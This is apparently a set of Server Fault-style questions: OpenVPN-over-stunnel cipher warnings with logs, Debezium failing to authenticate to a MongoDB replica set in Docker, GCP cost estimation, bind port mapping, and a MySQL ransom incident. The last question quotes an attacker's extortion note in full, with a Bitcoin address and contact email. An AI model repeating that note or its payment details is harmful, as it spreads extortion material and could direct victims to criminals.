<p>I've been debugging this all day and any help would be hugely appreciated.</p>

<p>I get the following warnings in the OVPN log:</p>

<pre><code>WARNING: 'link-mtu' is used inconsistently, local='link-mtu 1552', remote='link-mtu 1544'
WARNING: 'cipher' is used inconsistently, local='cipher AES-256-GCM', remote='cipher BF-CBC'
WARNING: 'auth' is used inconsistently, local='auth [null-digest]', remote='auth SHA1'
WARNING: 'keysize' is used inconsistently, local='keysize 256', remote='keysize 128'
</code></pre>

<p>stunnel settings server (included ssh test):</p>

<pre><code>[openvpn]
accept = 44444
connect = 127.0.0.1:1194
ciphers = DHE-RSA-AES256-SHA256

[sslssh]
accept = 55555
connect = 127.0.0.1:22
</code></pre>

<p>stunnel settings client: </p>

<p>[openvpn]</p>

<pre><code>client = yes
accept = 127.0.0.1:11194
connect = &lt;my_ip&gt;:44444
;cert = /usr/local/etc/stunnel/cert.pem
;connect = 192.168.255.25:44444
ciphers = DHE-RSA-AES256-SHA256

[sslssh]
client = yes
accept  = 127.0.0.1:2222
connect = &lt;my_IP&gt;:55555
</code></pre>

<p>client ovpn config:</p>

<pre><code>remote localhost 11194
proto tcp
remote-cert-tls server


client
dev tun
resolv-retry infinite
keepalive 10 120
nobind
comp-lzo
verb 3
</code></pre>

<p>server ovpn config : </p>

<pre><code>port 1194
proto tcp
dev tun

comp-lzo
keepalive 10 120

persist-key
persist-tun
user nobody
group nogroup

chroot /etc/openvpn/easy-rsa/keys/crl.jail
crl-verify crl.pem

ca /etc/openvpn/easy-rsa/keys/ca.crt
dh /etc/openvpn/easy-rsa/keys/dh2048.pem
tls-auth /etc/openvpn/easy-rsa/keys/ta.key 0
key /etc/openvpn/easy-rsa/keys/server.key
cert /etc/openvpn/easy-rsa/keys/server.crt

ifconfig-pool-persist /var/lib/openvpn/server.ipp
client-config-dir /etc/openvpn/server.ccd
status /var/log/openvpn/server.log
verb 4
</code></pre>

<p>full ovpn client log </p>

<pre><code>2019-05-27 14:10:53 *Tunnelblick: openvpnstart starting OpenVPN
*Tunnelblick: OS X 10.14.6; Tunnelblick 3.7.5a (build 5011); prior version 3.4.0 (build 4007)
2019-05-27 14:10:53 *Tunnelblick: Attempting connection with mikewarde_tcp_stunnel using shadow copy; Set nameserver = 769; monitoring connection
2019-05-27 14:10:53 *Tunnelblick: openvpnstart start mikewarde_tcp_stunnel.tblk 1337 769 0 1 0 1065264 -ptADGNWradsgnw 2.4.4-openssl-1.0.2o
2019-05-27 14:10:54 *Tunnelblick: openvpnstart log:
     OpenVPN started successfully. Command used to start OpenVPN (one argument per displayed line):

          /Applications/Tunnelblick.app/Contents/Resources/openvpn/openvpn-2.4.4-openssl-1.0.2o/openvpn
          --daemon
          --log
          /Library/Application Support/Tunnelblick/Logs/-SUsers-Smikewarde-SLibrary-SApplication Support-STunnelblick-SConfigurations-Smikewarde_tcp_stunnel.tblk-SContents-SResources-Sconfig.ovpn.769_0_1_0_1065264.1337.openvpn.log
          --cd
          /Library/Application Support/Tunnelblick/Users/mikewarde/mikewarde_tcp_stunnel.tblk/Contents/Resources
          --setenv
          IV_GUI_VER
          ""net.tunnelblick.tunnelblick 5011 3.7.5a (build 5011)""
          --verb
          3
          --config
          /Library/Application Support/Tunnelblick/Users/mikewarde/mikewarde_tcp_stunnel.tblk/Contents/Resources/config.ovpn
          --verb
          3
          --cd
          /Library/Application Support/Tunnelblick/Users/mikewarde/mikewarde_tcp_stunnel.tblk/Contents/Resources
          --management
          127.0.0.1
          1337
          /Library/Application Support/Tunnelblick/fognhooiggkindigaihckcifckpilcfpnmgdikmh.mip
          --management-query-passwords
          --management-hold
          --script-security
          2
          --up
          /Applications/Tunnelblick.app/Contents/Resources/client.up.tunnelblick.sh -9 -d -f -m -w -ptADGNWradsgnw
          --down
          /Applications/Tunnelblick.app/Contents/Resources/client.down.tunnelblick.sh -9 -d -f -m -w -ptADGNWradsgnw

2019-05-27 14:10:54 *Tunnelblick: Established communication with OpenVPN
2019-05-27 14:10:54 OpenVPN 2.4.4 x86_64-apple-darwin [SSL (OpenSSL)] [LZO] [LZ4] [PKCS11] [MH/RECVDA] [AEAD] built on Mar 27 2018
2019-05-27 14:10:54 library versions: OpenSSL 1.0.2o  27 Mar 2018, LZO 2.10
2019-05-27 14:10:54 MANAGEMENT: TCP Socket listening on [AF_INET]127.0.0.1:1337
2019-05-27 14:10:54 Need hold release from management interface, waiting...
2019-05-27 14:10:54 MANAGEMENT: Client connected from [AF_INET]127.0.0.1:1337
2019-05-27 14:10:54 MANAGEMENT: CMD 'pid'
2019-05-27 14:10:54 MANAGEMENT: CMD 'state on'
2019-05-27 14:10:54 MANAGEMENT: CMD 'state'
2019-05-27 14:10:54 MANAGEMENT: CMD 'bytecount 1'
2019-05-27 14:10:54 MANAGEMENT: CMD 'hold release'
2019-05-27 14:10:54 NOTE: the current --script-security setting may allow this configuration to call user-defined scripts
2019-05-27 14:10:54 Outgoing Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
2019-05-27 14:10:54 Incoming Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
2019-05-27 14:10:54 MANAGEMENT: &gt;STATE:1558962654,RESOLVE,,,,,,
2019-05-27 14:10:54 TCP/UDP: Preserving recently used remote address: [AF_INET]127.0.0.1:11194
2019-05-27 14:10:54 Socket Buffers: R=[131072-&gt;131072] S=[131072-&gt;131072]
2019-05-27 14:10:54 Attempting to establish TCP connection with [AF_INET]127.0.0.1:11194 [nonblock]
2019-05-27 14:10:54 MANAGEMENT: &gt;STATE:1558962654,TCP_CONNECT,,,,,,
2019-05-27 14:10:55 TCP connection established with [AF_INET]127.0.0.1:11194
2019-05-27 14:10:55 TCP_CLIENT link local: (not bound)
2019-05-27 14:10:55 TCP_CLIENT link remote: [AF_INET]127.0.0.1:11194
2019-05-27 14:10:55 MANAGEMENT: &gt;STATE:1558962655,WAIT,,,,,,
2019-05-27 14:10:55 MANAGEMENT: &gt;STATE:1558962655,AUTH,,,,,,
2019-05-27 14:10:55 TLS: Initial packet from [AF_INET]127.0.0.1:11194, sid=c58c277c 5918dc12
2019-05-27 14:10:55 VERIFY OK: depth=1, C=US, ST=CA, L=San Francisco, O=TurnKey Linux, OU=OpenVPN, CN=server, name=openvpn, emailAddress=vpn@radged.com
2019-05-27 14:10:55 VERIFY KU OK
2019-05-27 14:10:55 Validating certificate extended key usage
2019-05-27 14:10:55 ++ Certificate has EKU (str) TLS Web Server Authentication, expects TLS Web Server Authentication
2019-05-27 14:10:55 VERIFY EKU OK
2019-05-27 14:10:55 VERIFY OK: depth=0, C=US, ST=CA, L=San Francisco, O=TurnKey Linux, OU=OpenVPN, CN=server, name=openvpn, emailAddress=vpn@radged.com
2019-05-27 14:10:55 Control Channel: TLSv1.2, cipher TLSv1/SSLv3 ECDHE-RSA-AES256-GCM-SHA384, 2048 bit RSA
2019-05-27 14:10:55 [server] Peer Connection Initiated with [AF_INET]127.0.0.1:11194
2019-05-27 14:10:57 MANAGEMENT: &gt;STATE:1558962657,GET_CONFIG,,,,,,
2019-05-27 14:10:57 SENT CONTROL [server]: 'PUSH_REQUEST' (status=1)
2019-05-27 14:10:57 PUSH: Received control message: 'PUSH_REPLY,redirect-gateway def1 bypass-dhcp,dhcp-option DNS 208.67.222.222,dhcp-option DNS 208.67.220.220,route 10.222.29.1,topology net30,ping 10,ping-restart 120,ifconfig 10.222.29.6 10.222.29.5,peer-id 0,cipher AES-256-GCM'
2019-05-27 14:10:57 OPTIONS IMPORT: timers and/or timeouts modified
2019-05-27 14:10:57 OPTIONS IMPORT: --ifconfig/up options modified
2019-05-27 14:10:57 OPTIONS IMPORT: route options modified
2019-05-27 14:10:57 OPTIONS IMPORT: --ip-win32 and/or --dhcp-option options modified
2019-05-27 14:10:57 OPTIONS IMPORT: peer-id set
2019-05-27 14:10:57 OPTIONS IMPORT: adjusting link_mtu to 1627
2019-05-27 14:10:57 OPTIONS IMPORT: data channel crypto options modified
2019-05-27 14:10:57 Data Channel: using negotiated cipher 'AES-256-GCM'
2019-05-27 14:10:57 Outgoing Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
2019-05-27 14:10:57 Incoming Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
2019-05-27 14:10:57 Opening utun (connect(AF_SYS_CONTROL)): Resource busy (errno=16)
2019-05-27 14:10:57 Opening utun (connect(AF_SYS_CONTROL)): Resource busy (errno=16)
2019-05-27 14:10:57 Opened utun device utun2
2019-05-27 14:10:57 do_ifconfig, tt-&gt;did_ifconfig_ipv6_setup=0
2019-05-27 14:10:57 MANAGEMENT: &gt;STATE:1558962657,ASSIGN_IP,,10.222.29.6,,,,
2019-05-27 14:10:57 /sbin/ifconfig utun2 delete
                                        ifconfig: ioctl (SIOCDIFADDR): Can't assign requested address
2019-05-27 14:10:57 NOTE: Tried to delete pre-existing tun/tap instance -- No Problem if failure
2019-05-27 14:10:57 /sbin/ifconfig utun2 10.222.29.6 10.222.29.5 mtu 1500 netmask 255.255.255.255 up
2019-05-27 14:10:57 /Applications/Tunnelblick.app/Contents/Resources/client.up.tunnelblick.sh -9 -d -f -m -w -ptADGNWradsgnw utun2 1500 1555 10.222.29.6 10.222.29.5 init
                                        **********************************************
                                        Start of output from client.up.tunnelblick.sh
                                        Disabled IPv6 for 'iPhone USB'
                                        Disabled IPv6 for 'Wi-Fi'
                                        Disabled IPv6 for 'Bluetooth PAN'
                                        Disabled IPv6 for 'Thunderbolt Bridge'
                                        Retrieved from OpenVPN: name server(s) [ 208.67.222.222 208.67.220.220 ], search domain(s) [  ] and SMB server(s) [  ] and using default domain name [ openvpn ]
                                        WARNING: Ignoring ServerAddresses '208.67.222.222 208.67.220.220' because ServerAddresses was set manually and '-allowChangesToManuallySetNetworkSettings' was not specified
                                        Setting search domains to 'openvpn' because running under OS X 10.6 or higher and the search domains were not set manually (or are allowed to be changed) and 'Prepend domain name to search domains' was not selected
                                        Saved the DNS and SMB configurations so they can be restored
                                        Did not change DNS ServerAddresses setting of '1.1.1.1 1.0.0.1' (but re-set it)
                                        Changed DNS SearchDomains setting from '' to 'openvpn'
                                        Changed DNS DomainName setting from '' to 'openvpn'
                                        Did not change SMB NetBIOSName setting of ''
                                        Did not change SMB Workgroup setting of ''
                                        Did not change SMB WINSAddresses setting of ''
                                        DNS servers '1.1.1.1 1.0.0.1' were set manually
                                        DNS servers '1.1.1.1 1.0.0.1' will be used for DNS queries when the VPN is active
                                        NOTE: The DNS servers do not include any free public DNS servers known to Tunnelblick. This may cause DNS queries to fail or be intercepted or falsified even if they are directed through the VPN. Specify only known public DNS servers or DNS servers located on the VPN network to avoid such problems.
                                        Flushed the DNS cache via dscacheutil
                                        /usr/sbin/discoveryutil not present. Not flushing the DNS cache via discoveryutil
                                        Notified mDNSResponder that the DNS cache was flushed
                                        Setting up to monitor system configuration with process-network-changes
                                        End of output from client.up.tunnelblick.sh
                                        **********************************************
2019-05-27 14:11:00 *Tunnelblick: No 'connected.sh' script to execute
2019-05-27 14:11:00 /sbin/route add -net 127.0.0.1 192.168.255.1 255.255.255.255
                                        add net 127.0.0.1: gateway 192.168.255.1
2019-05-27 14:11:00 /sbin/route add -net 0.0.0.0 10.222.29.5 128.0.0.0
                                        add net 0.0.0.0: gateway 10.222.29.5
2019-05-27 14:11:00 /sbin/route add -net 128.0.0.0 10.222.29.5 128.0.0.0
                                        add net 128.0.0.0: gateway 10.222.29.5
2019-05-27 14:11:00 MANAGEMENT: &gt;STATE:1558962660,ADD_ROUTES,,,,,,
2019-05-27 14:11:00 /sbin/route add -net 10.222.29.1 10.222.29.5 255.255.255.255
                                        add net 10.222.29.1: gateway 10.222.29.5
2019-05-27 14:11:00 WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this
2019-05-27 14:11:00 Initialization Sequence Completed
2019-05-27 14:11:00 MANAGEMENT: &gt;STATE:1558962660,CONNECTED,SUCCESS,10.222.29.6,127.0.0.1,11194,127.0.0.1,55166
2019-05-27 14:11:24 Connection reset, restarting [-1]
2019-05-27 14:11:24 /sbin/route delete -net 10.222.29.1 10.222.29.5 255.255.255.255
                                        delete net 10.222.29.1: gateway 10.222.29.5
2019-05-27 14:11:24 /sbin/route delete -net 127.0.0.1 192.168.255.1 255.255.255.255
                                        delete net 127.0.0.1: gateway 192.168.255.1
2019-05-27 14:11:24 /sbin/route delete -net 0.0.0.0 10.222.29.5 128.0.0.0
                                        delete net 0.0.0.0: gateway 10.222.29.5
2019-05-27 14:11:24 /sbin/route delete -net 128.0.0.0 10.222.29.5 128.0.0.0
                                        delete net 128.0.0.0: gateway 10.222.29.5
2019-05-27 14:11:24 Closing TUN/TAP interface
2019-05-27 14:11:24 /Applications/Tunnelblick.app/Contents/Resources/client.down.tunnelblick.sh -9 -d -f -m -w -ptADGNWradsgnw utun2 1500 1555 10.222.29.6 10.222.29.5 init
                                        **********************************************
                                        Start of output from client.down.tunnelblick.sh
                                        Cancelled monitoring of system configuration changes
                                        Restored the DNS and SMB configurations
                                        Re-enabled IPv6 (automatic) for 'iPhone USB'
                                        Re-enabled IPv6 (automatic) for 'Wi-Fi'
                                        Re-enabled IPv6 (automatic) for 'Bluetooth PAN'
                                        Re-enabled IPv6 (automatic) for 'Thunderbolt Bridge'
                                        Flushed the DNS cache via dscacheutil
                                        /usr/sbin/discoveryutil not present. Not flushing the DNS cache via discoveryutil
                                        Notified mDNSResponder that the DNS cache was flushed
                                        End of output from client.down.tunnelblick.sh
                                        **********************************************
2019-05-27 14:11:25 SIGUSR1[soft,connection-reset] received, process restarting
2019-05-27 14:11:25 MANAGEMENT: &gt;STATE:1558962685,RECONNECTING,connection-reset,,,,,
2019-05-27 14:11:25 *Tunnelblick: No 'reconnecting.sh' script to execute
2019-05-27 14:11:25 MANAGEMENT: CMD 'hold release'
2019-05-27 14:11:25 MANAGEMENT: CMD 'hold release'
2019-05-27 14:11:25 NOTE: the current --script-security setting may allow this configuration to call user-defined scripts
2019-05-27 14:11:25 Outgoing Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
2019-05-27 14:11:25 Incoming Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
2019-05-27 14:11:25 TCP/UDP: Preserving recently used remote address: [AF_INET]127.0.0.1:11194
2019-05-27 14:11:25 Socket Buffers: R=[131072-&gt;131072] S=[131072-&gt;131072]
2019-05-27 14:11:25 Attempting to establish TCP connection with [AF_INET]127.0.0.1:11194 [nonblock]
2019-05-27 14:11:25 MANAGEMENT: &gt;STATE:1558962685,TCP_CONNECT,,,,,,
2019-05-27 14:11:26 TCP connection established with [AF_INET]127.0.0.1:11194
2019-05-27 14:11:26 TCP_CLIENT link local: (not bound)
2019-05-27 14:11:26 TCP_CLIENT link remote: [AF_INET]127.0.0.1:11194
2019-05-27 14:11:26 MANAGEMENT: &gt;STATE:1558962686,WAIT,,,,,,
2019-05-27 14:11:26 MANAGEMENT: &gt;STATE:1558962686,AUTH,,,,,,
2019-05-27 14:11:26 TLS: Initial packet from [AF_INET]127.0.0.1:11194, sid=072914d3 4912c8a0
2019-05-27 14:11:26 VERIFY OK: depth=1, C=US, ST=CA, L=San Francisco, O=TurnKey Linux, OU=OpenVPN, CN=server, name=openvpn, emailAddress=vpn@radged.com
2019-05-27 14:11:26 VERIFY KU OK
2019-05-27 14:11:26 Validating certificate extended key usage
2019-05-27 14:11:26 ++ Certificate has EKU (str) TLS Web Server Authentication, expects TLS Web Server Authentication
2019-05-27 14:11:26 VERIFY EKU OK
2019-05-27 14:11:26 VERIFY OK: depth=0, C=US, ST=CA, L=San Francisco, O=TurnKey Linux, OU=OpenVPN, CN=server, name=openvpn, emailAddress=vpn@radged.com
2019-05-27 14:11:26 WARNING: 'link-mtu' is used inconsistently, local='link-mtu 1552', remote='link-mtu 1544'
2019-05-27 14:11:26 WARNING: 'cipher' is used inconsistently, local='cipher AES-256-GCM', remote='cipher BF-CBC'
2019-05-27 14:11:26 WARNING: 'auth' is used inconsistently, local='auth [null-digest]', remote='auth SHA1'
2019-05-27 14:11:26 WARNING: 'keysize' is used inconsistently, local='keysize 256', remote='keysize 128'
2019-05-27 14:11:26 Control Channel: TLSv1.2, cipher TLSv1/SSLv3 ECDHE-RSA-AES256-GCM-SHA384, 2048 bit RSA
2019-05-27 14:11:26 [server] Peer Connection Initiated with [AF_INET]127.0.0.1:11194
2019-05-27 14:11:26 *Tunnelblick: Disconnecting; notification window disconnect button pressed
2019-05-27 14:11:27 *Tunnelblick: No 'pre-disconnect.sh' script to execute
2019-05-27 14:11:27 *Tunnelblick: Disconnecting using 'kill'
2019-05-27 14:11:27 event_wait : Interrupted system call (code=4)
2019-05-27 14:11:27 SIGTERM[hard,] received, process exiting
2019-05-27 14:11:27 MANAGEMENT: &gt;STATE:1558962687,EXITING,SIGTERM,,,,,
2019-05-27 14:11:27 *Tunnelblick: No 'post-disconnect.sh' script to execute
2019-05-27 14:11:27 *Tunnelblick: Expected disconnection occurred.
</code></pre>
","<openvpn><port-forwarding><stunnel>","2019-05-27 13:32:13"
"916701","DEBEZIUM -- Mongodb primary node not Resolved in Debezium Kafka Connect -- Docker Compose","<p>i have this docker compose file, that contains <code>bitnami/mongodb</code> containers for creating a replica set. and I've used <code>zookeeper</code>, <code>kafka</code> &amp; <code>debezium-connector</code> for monitoring my mongodb replica set.</p>

<pre><code>version: '2.2'
services:
    mongodb-primary:
        hostname: mongodb-primary
        image: 'bitnami/mongodb:latest'
        ports:
            - 27017:27017
        environment:
            - MONGODB_REPLICA_SET_NAME=rs0
            - MONGODB_REPLICA_SET_MODE=primary
            - MONGODB_ROOT_PASSWORD=another_root
            - MONGODB_DATABASE=genomics
            - MONGODB_REPLICA_SET_KEY=replicasetkey123
            - MONGODB_USERNAME=genomics_user
            - MONGODB_PASSWORD=another
            - MONGODB_ADVERTISED_HOSTNAME=mongodb-primary
        volumes:
            - 'mongodb_master_data:/bitnami'
    mongodb-secondary:
        hostname: mongodb-secondary
        image: 'bitnami/mongodb:latest'
        depends_on:
            - mongodb-primary
        environment:
            - MONGODB_REPLICA_SET_NAME=rs0
            - MONGODB_REPLICA_SET_MODE=secondary
            - MONGODB_PRIMARY_HOST=mongodb-primary
            - MONGODB_PRIMARY_PORT_NUMBER=27017
            - MONGODB_PRIMARY_ROOT_PASSWORD=another_root
            - MONGODB_REPLICA_SET_KEY=replicasetkey123
            - MONGODB_USERNAME=genomics_user
            - MONGODB_PASSWORD=another
            - MONGODB_DATABASE=genomics
            - MONGODB_ADVERTISED_HOSTNAME=mongodb-secondary
    mongodb-arbiter:
        hostname: mongodb-arbiter
        image: 'bitnami/mongodb:latest'
        depends_on:
            - mongodb-primary
        environment:
            - MONGODB_REPLICA_SET_NAME=rs0
            - MONGODB_REPLICA_SET_MODE=arbiter
            - MONGODB_PRIMARY_HOST=mongodb-primary
            - MONGODB_PRIMARY_PORT_NUMBER=27017
            - MONGODB_PRIMARY_ROOT_PASSWORD=another_root
            - MONGODB_REPLICA_SET_KEY=replicasetkey123
            - MONGODB_USERNAME=genomics_user
            - MONGODB_PASSWORD=another
            - MONGODB_DATABASE=genomics
            - MONGODB_ADVERTISED_HOSTNAME=mongodb-arbiter
    debezium_connect:
        image: debezium/connect:0.7
        ports:
            - 8083:8083
        environment:
            - BOOTSTRAP_SERVERS=kafka:9092
            - GROUP_ID=1
            - CONFIG_STORAGE_TOPIC=my_connect_configs
            - OFFSET_STORAGE_TOPIC=my_connect_offsets
        links:
            - kafka
            - mongodb-primary
    kafka:
        image: debezium/kafka:0.7
        environment:
            KAFKA_ADVERTISED_HOST_NAME: kafka
            KAFKA_ADVERTISED_PORT: 9092
            KAFKA_ZOOKEEPER_CONNECT: zookeeper:2181
            ZOOKEEPER_CONNECT: zookeeper:2181
            KAFKA_CREATE_TOPICS: ""topic-jhipster:1:1""
        ports:
            - 9092:9092
        links:
            - zookeeper
    zookeeper:
        image: debezium/zookeeper:0.7
        ports:
            - 2181:2181
            - 2888:2888
            - 3888:3888
    consul:
        image: consul:0.9.3
        command: consul agent -dev -ui -client 0.0.0.0
        ports:
            - 8300:8300
            - 8500:8500
            - 8600:8600
    consul-config-loader:
        image: jhipster/consul-config-loader:v0.2.2
        volumes:
            - ./central-server-config:/config
        environment:
            - INIT_SLEEP_SECONDS=5
            - CONSUL_URL=consul
            - CONSUL_PORT=8500
        # Uncomment to load configuration into Consul from a Git repository
        # as configured in central-server-config/git2consul.json
        # Also set SPRING_CLOUD_CONSUL_CONFIG_FORMAT=files on your apps
        #    - CONFIG_MODE=git

volumes:
    mongodb_master_data:
        driver: local

# networks:
#     app-tier:
#         driver: bridge
</code></pre>

<p>so i started this file by</p>

<pre><code>docker-compose -f app.yaml up
</code></pre>

<p>and now <code>debezium_connect</code> image is ready for accepting a mongodb connector properties:</p>

<pre><code>{
    ""name"": ""run-connector"",
    ""config"": {
        ""connector.class"" : ""io.debezium.connector.mongodb.MongoDbConnector"",
        ""tasks.max"" : ""1"",
        ""mongodb.hosts"" : ""rs0/mongodb-primary:27017"",
        ""mongodb.name"" : ""genomics"",
        ""mongodb.user"" : ""genomics_user"",
        ""mongodb.password"" : ""another"",
        ""database.whitelist"" : ""inventory"",
        ""database.history.kafka.bootstrap.servers"" : ""kafka:9092""
    }
}
</code></pre>

<p>which is done by using this command:</p>

<pre><code>curl -i -X POST -H ""Accept:application/json"" -H  ""Content-Type:application/json"" http://localhost:8083/connectors/ -d @register-mongodb.json
</code></pre>

<p>in which <code>register-mongodb.json</code> content is displayed above.
but after curling this error comes out of debezium_connect:</p>

<pre><code>2018-06-05 15:49:35,080 INFO   MongoDB|genomics|disc  No server chosen by ReadPreferenceServerSelector{readPreference=primary} from cluster description ClusterDescription{type=UNKNOWN, connectionMode=MULTIPLE, serverDescriptions=[ServerDescription{address=mongodb-primary:27017, type=UNKNOWN, state=CONNECTING, exception={com.mongodb.MongoSecurityException: Exception authenticating MongoCredential{mechanism=null, userName='genomics_user', source='admin', password=&lt;hidden&gt;, mechanismProperties={}}}, caused by {com.mongodb.MongoCommandException: Command failed with error 18: 'Authentication failed.' on server mongodb-primary:27017. The full response is { ""ok"" : 0.0, ""errmsg"" : ""Authentication failed."", ""code"" : 18, ""codeName"" : ""AuthenticationFailed"", ""operationTime"" : { ""$timestamp"" : { ""t"" : 1528213769, ""i"" : 1 } }, ""$clusterTime"" : { ""clusterTime"" : { ""$timestamp"" : { ""t"" : 1528213769, ""i"" : 1 } }, ""signature"" : { ""hash"" : { ""$binary"" : ""vSvTuw+hQCycX/rSliCcxWEh1BM="", ""$type"" : ""00"" }, ""keyId"" : { ""$numberLong"" : ""6563606422322413569"" } } } }}}]}. Waiting for 30000 ms before timing out   [org.mongodb.driver.cluster]
2018-06-05 15:50:05,081 ERROR  MongoDB|genomics|disc  Error while reading the 'shards' collection in the 'config' database: Timed out after 30000 ms while waiting for a server that matches ReadPreferenceServerSelector{readPreference=primary}. Client view of cluster state is {type=UNKNOWN, servers=[{address=mongodb-primary:27017, type=UNKNOWN, state=CONNECTING, exception={com.mongodb.MongoSecurityException: Exception authenticating MongoCredential{mechanism=null, userName='genomics_user', source='admin', password=&lt;hidden&gt;, mechanismProperties={}}}, caused by {com.mongodb.MongoCommandException: Command failed with error 18: 'Authentication failed.' on server mongodb-primary:27017. The full response is { ""ok"" : 0.0, ""errmsg"" : ""Authentication failed."", ""code"" : 18, ""codeName"" : ""AuthenticationFailed"", ""operationTime"" : { ""$timestamp"" : { ""t"" : 1528213799, ""i"" : 1 } }, ""$clusterTime"" : { ""clusterTime"" : { ""$timestamp"" : { ""t"" : 1528213799, ""i"" : 1 } }, ""signature"" : { ""hash"" : { ""$binary"" : ""tk+Fd4ytnt/O8TMDyG43h79fnkk="", ""$type"" : ""00"" }, ""keyId"" : { ""$numberLong"" : ""6563606422322413569"" } } } }}}]   [io.debezium.connector.mongodb.ReplicaSetDiscovery]
com.mongodb.MongoTimeoutException: Timed out after 30000 ms while waiting for a server that matches ReadPreferenceServerSelector{readPreference=primary}. Client view of cluster state is {type=UNKNOWN, servers=[{address=mongodb-primary:27017, type=UNKNOWN, state=CONNECTING, exception={com.mongodb.MongoSecurityException: Exception authenticating MongoCredential{mechanism=null, userName='genomics_user', source='admin', password=&lt;hidden&gt;, mechanismProperties={}}}, caused by {com.mongodb.MongoCommandException: Command failed with error 18: 'Authentication failed.' on server mongodb-primary:27017. The full response is { ""ok"" : 0.0, ""errmsg"" : ""Authentication failed."", ""code"" : 18, ""codeName"" : ""AuthenticationFailed"", ""operationTime"" : { ""$timestamp"" : { ""t"" : 1528213799, ""i"" : 1 } }, ""$clusterTime"" : { ""clusterTime"" : { ""$timestamp"" : { ""t"" : 1528213799, ""i"" : 1 } }, ""signature"" : { ""hash"" : { ""$binary"" : ""tk+Fd4ytnt/O8TMDyG43h79fnkk="", ""$type"" : ""00"" }, ""keyId"" : { ""$numberLong"" : ""6563606422322413569"" } } } }}}]
    at com.mongodb.connection.BaseCluster.createTimeoutException(BaseCluster.java:377)
    at com.mongodb.connection.BaseCluster.selectServer(BaseCluster.java:104)
    at com.mongodb.binding.ClusterBinding$ClusterBindingConnectionSource.&lt;init&gt;(ClusterBinding.java:75)
    at com.mongodb.binding.ClusterBinding$ClusterBindingConnectionSource.&lt;init&gt;(ClusterBinding.java:71)
    at com.mongodb.binding.ClusterBinding.getReadConnectionSource(ClusterBinding.java:63)
    at com.mongodb.operation.OperationHelper.withConnection(OperationHelper.java:402)
    at com.mongodb.operation.ListDatabasesOperation.execute(ListDatabasesOperation.java:102)
    at com.mongodb.operation.ListDatabasesOperation.execute(ListDatabasesOperation.java:54)
    at com.mongodb.Mongo.execute(Mongo.java:836)
    at com.mongodb.Mongo$2.execute(Mongo.java:823)
    at com.mongodb.OperationIterable.iterator(OperationIterable.java:47)
    at com.mongodb.ListDatabasesIterableImpl.iterator(ListDatabasesIterableImpl.java:57)
    at com.mongodb.MappingIterable.iterator(MappingIterable.java:36)
    at io.debezium.connector.mongodb.MongoUtil.contains(MongoUtil.java:181)
    at io.debezium.connector.mongodb.MongoUtil.contains(MongoUtil.java:170)
    at io.debezium.connector.mongodb.MongoUtil.onDatabase(MongoUtil.java:114)
    at io.debezium.connector.mongodb.MongoUtil.onCollection(MongoUtil.java:129)
    at io.debezium.connector.mongodb.MongoUtil.onCollectionDocuments(MongoUtil.java:148)
    at io.debezium.connector.mongodb.ReplicaSetDiscovery.getReplicaSets(ReplicaSetDiscovery.java:67)
    at io.debezium.connector.mongodb.ReplicaSetMonitorThread.run(ReplicaSetMonitorThread.java:63)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
    at java.lang.Thread.run(Thread.java:748)
2018-06-05 15:50:05,082 INFO   MongoDB|genomics|disc  Cluster description not yet available. Waiting for 30000 ms before timing out   [org.mongodb.driver.cluster]
</code></pre>

<p>is there any problem with my network? i think debezium_connect can't see mongodb-primary, so it can't authenticate..</p>

<p>you can delete existing ""run-connector"" by this command:</p>

<pre><code>curl -X DELETE localhost:8083/connectors/run-connector/
</code></pre>

<p>i can authenticate into mongo-replica-set by other third party tools like <code>robo3t</code> or another application which i wrote myself. but can't do it with  <code>debezium_connect</code> in docker network. also should note that the application i wrote myself has no problem connecting to mongodb in the docker network.</p>
","<mongodb><bitnami>","2018-06-05 15:55:24"
"916718","Cost of deploying many smaller programs via GCP","<p>Our company has many customers whose hardware we support. I'd like to create a series of anomaly detection programs (ADs), e.g. using TensorFlow, to monitor their accounts for unusual disk activity, spikes in latency, etc.</p>

<p>I'm hoping to use GCP to help solve the problem and host the programs that we design, but first I've been asked to give an estimate of how much it will cost. Management is worried that creating and deploying hundreds of these ADs will take lots of disk space and involve significant ongoing cost.</p>

<p>I am but a humble data scientist, plus relatively new to GCP, and therefore don't feel that I'm in a position to give a definitive answer, even though my intuition tells me that this is what GCP was designed for and should be able to handle it without breaking the bank.</p>

<p>Can anyone more knowledgable in this area either back me up and/or warn me about the logistics of deploying many, many smaller programs via GCP?</p>
","<google-cloud-platform><google-compute-engine><google-app-engine>","2018-06-14 18:35:22"
"916810","Use Different port for Different IP bind","<p>I am using bind for internal networking it is working good,</p>

<p>now I am a another requirement.</p>

<p>bind9 resolving the domain myweb.example.com from ip 192.168.1.1 port 80</p>

<p>now I want to resolve domain myweb.example.com:82 from 192.168.1.2:82.</p>

<p>is that possible?</p>
","<ubuntu><bind>","2018-06-15 10:09:56"
"969253","Database hack on ubuntu server","<p>I have installed mysql to an ubuntu (Digital Ocean) server. There are no any extra security layers. Just basic installations.</p>

<p>Recently it was hacked and deleted with only one table which has the following message:</p>

<blockquote>
  <p>To recover your lost Database and avoid leaking it: Send us 0.1
  Bitcoin (BTC) to our Bitcoin address
  17rDr5mbXjLdegWDFuWd61Ymhwm54GjtNK and contact us by Email with your
  Server IP or Domain name and a Proof of Payment. If you are unsure if
  we have your data, contact us and we will send you a proof. Your
  Database is downloaded and backed up on our servers. Backups that we
  have right now: drm, eatoeat . If we dont receive your payment in the
  next 10 Days, we will make your database public or use them otherwise.
  | 17rDr5mbXjLdegWDFuWd61Ymhwm54GjtNK | support@mydatabase.to</p>
</blockquote>

<p>When I checked there are lot of bitcoin abuse reports for this bitcoin address and the email associated with it.</p>

<p>What are the measures and steps I can take to prevent this from happening again?</p>
","<mysql><ubuntu-18.04><digital-ocean>","2019-05-29 04:07:26"
